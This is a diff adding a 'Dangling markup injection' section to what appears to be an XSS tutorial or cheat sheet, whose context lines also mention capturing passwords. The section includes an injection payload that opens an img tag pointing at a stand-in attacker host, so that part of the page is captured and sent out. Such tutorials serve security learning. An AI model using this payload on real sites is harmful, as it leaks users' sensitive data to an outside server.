@@ -35,6 +35,7 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 - [capture password](#exploiting-cross-site-scripting-to-capture-passwords)
 
 ### Others
+- [Dangling markup injection](#dangling-markup-injection)
 - [Prevent XSS attack](#prevent-xss)
 
 ## Verify XSS
@@ -441,6 +442,30 @@ CSRF way to write the password + username in the comment section:
         body: data
 });">
 ```
+
+## Dangling markup injection
+
+Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
+
+### What is dangling markup injection?
+
+Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
+
+Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
+
+```HTML
+<input type="text" name="input" value="CONTROLLABLE DATA HERE
+```
+
+If you send that:
+
+```html
+"><img src='//attacker-website.com?
+```
+
+This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling".
+
+The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data.
 
 ## Prevent XSS
 
